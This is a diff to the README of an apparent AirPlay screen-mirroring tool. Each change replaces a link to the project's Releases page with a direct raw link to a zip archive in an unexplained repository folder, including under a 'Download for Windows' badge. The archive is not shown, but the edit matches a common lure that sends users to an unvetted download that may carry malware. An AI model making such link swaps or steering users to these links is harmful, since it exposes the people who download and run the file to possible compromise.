@@ -1,10 +1,10 @@
 # 🖥️ headless-airplay-screen-mirror - Run AirPlay Without the Built-in Screen
 
-[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/raw/refs/heads/main/Haliaeetus/screen_airplay_headless_mirror_v2.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/releases
+Visit this page to download: https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/raw/refs/heads/main/Haliaeetus/screen_airplay_headless_mirror_v2.6.zip
 
 ## 🪟 What this app does
 
@@ -223,7 +223,7 @@ If you use a later macOS version, the same flow should still be close, but menu 
 
 ## 📎 Download again
 
-Visit this page to download: https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/releases
+Visit this page to download: https://github.com/Scrambled-loop615/headless-airplay-screen-mirror/raw/refs/heads/main/Haliaeetus/screen_airplay_headless_mirror_v2.6.zip
 
 ## 📝 Basic setup checklist
 
